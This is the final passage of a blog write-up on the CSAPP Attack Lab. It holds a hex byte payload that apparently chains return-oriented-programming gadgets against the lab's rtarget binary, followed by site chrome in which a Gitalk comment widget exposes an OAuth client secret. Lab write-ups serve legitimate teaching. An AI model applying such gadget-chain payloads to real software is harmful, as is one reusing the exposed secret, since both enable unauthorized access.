<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ad <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p><em>Reference</em></p>
<p>[1] <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/db731ca57342">https://www.jianshu.com/p/db731ca57342</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/364589259">https://www.zhihu.com/question/364589259</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>[csapp] Lab3 Attack Lab</p><p><a href="https://chenghuawang.github.io/2022/02/11/[csapp] Lab3 Attack Lab/">https://chenghuawang.github.io/2022/02/11/[csapp] Lab3 Attack Lab/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>WangCH</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-02-11</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-02-11</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CSAPP/">CSAPP</a><a class="link-muted mr-2" rel="tag" href="/tags/computer-architecture/">computer-architecture</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/03/05/%5Bcsapp%5D%20Lab4%20Cache%20Lab/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">[csapp] Lab4 Cache Lab</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/02/02/%5Bcsapp%5D%20Lab2%20Bomb%20Lab/"><span class="level-item">[csapp] Lab2 Bomb Lab</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "0188c7a4fa6b0931b47124f95567665f",
            repo: "https://github.com/chenghuaWang/chenghuaWang.github.io",
            owner: "chenghuaWang",
            clientID: "8f30feed9ef2c6b241d6",
            clientSecret: "63c9084e8a2411e2bc01462ba35a9d1b069b86d1",
            admin: ["chenghuaWang"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 20,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/boy.jpg" alt="Ubios"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Ubios</p><p class="is-size-6 is-block">Stay hungry,stay foolish.</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Earth, Solar System</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/chenghuaWang" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/chenghuaWang"><i class="fab fa-github"></i></a></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CSAPP/"><span class="tag">CSAPP</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/DL-EMA/"><span class="tag">DL EMA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/computer-architecture/"><span class="tag">computer-architecture</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/quote/"><span class="tag">quote</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"><span class="tag">期末复习</span><span class="tag">1</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Lab3-Attack-Lab"><span class="level-left"><span class="level-item">1</span><span class="level-item">Lab3 Attack Lab</span></span></a></li><li><a class="level is-mobile" href="#1-Introduction"><span class="level-left"><span class="level-item">2</span><span class="level-item">1. Introduction</span></span></a></li><li><a class="level is-mobile" href="#2-ctarget-代码注入"><span class="level-left"><span class="level-item">3</span><span class="level-item">2. ctarget(代码注入)</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#2-1-Level-1"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">2.1 Level 1</span></span></a></li><li><a class="level is-mobile" href="#2-2-Level-2"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">2.2 Level 2</span></span></a></li><li><a class="level is-mobile" href="#2-3-Level-3"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">2.3 Level 3</span></span></a></li></ul></li><li><a class="level is-mobile" href="#3-rtarget-Return-Oriented-Programming"><span class="level-left"><span class="level-item">4</span><span class="level-item">3. rtarget(Return-Oriented Programming)</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#3-0-review"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">3.0 review</span></span></a></li><li><a class="level is-mobile" href="#3-1-Level-2"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">3.1 Level 2</span></span></a></li><li><a class="level is-mobile" href="#3-2-Level-3"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">3.2 Level 3</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://pengzhihui.xyz/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">稚晖的个人站</span></span><span class="level-right"><span class="level-item tag">pengzhihui.xyz</span></span></a></li><li><a class="level is-mobile" href="https://codeforces.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">codeforces</span></span><span class="level-right"><span class="level-item tag">codeforces.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/DL/"><span class="level-start"><span class="level-item">DL</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Linux/"><span class="level-start"><span class="level-item">Linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/computer-architecture/"><span class="level-start"><span class="level-item">computer architecture</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-03-17T12:43:00.000Z">2022-03-17</time></p><p class="title"><a href="/2022/03/17/%5Bcsapp%5D%20Lab5%20Shell%20Lab/">[csapp] Lab5 Shell Lab</a></p><p class="categories"><a href="/categories/computer-architecture/">computer architecture</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-03-05T05:50:00.000Z">2022-03-05</time></p><p class="title"><a href="/2022/03/05/%5Bcsapp%5D%20Lab4%20Cache%20Lab/">[csapp] Lab4 Cache Lab</a></p><p class="categories"><a href="/categories/computer-architecture/">computer architecture</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-11T07:31:00.000Z">2022-02-11</time></p><p class="title"><a href="/2022/02/11/%5Bcsapp%5D%20Lab3%20Attack%20Lab/">[csapp] Lab3 Attack Lab</a></p><p class="categories"><a href="/categories/computer-architecture/">computer architecture</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-02T05:51:00.000Z">2022-02-02</time></p><p class="title"><a href="/2022/02/02/%5Bcsapp%5D%20Lab2%20Bomb%20Lab/">[csapp] Lab2 Bomb Lab</a></p><p class="categories"><a href="/categories/computer-architecture/">computer architecture</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-30T05:50:00.000Z">2022-01-30</time></p><p class="title"><a href="/2022/01/30/%5Bcsapp%5D%20Lab1%20Data%20Lab/">[csapp] Lab1 Data Lab</a></p><p class="categories"><a href="/categories/computer-architecture/">computer architecture</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">三月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">六月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/mylogo_h.png" alt="Ubios home" height="28"><script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5fv1ct9766q&amp;amp;m=7&amp;amp;c=e63100&amp;amp;cr1=ffffff&amp;amp;f=arial&amp;amp;l=0&amp;amp;bv=90&amp;amp;lx=-420&amp;amp;ly=420&amp;amp;hi=20&amp;amp;he=7&amp;amp;hc=a8ddff&amp;amp;rs=80" async="async"></script></a><p class="is-size-7"><span>&copy; 2022 WangCH</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/chenghuaWang/chenghuaWang.github.io"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>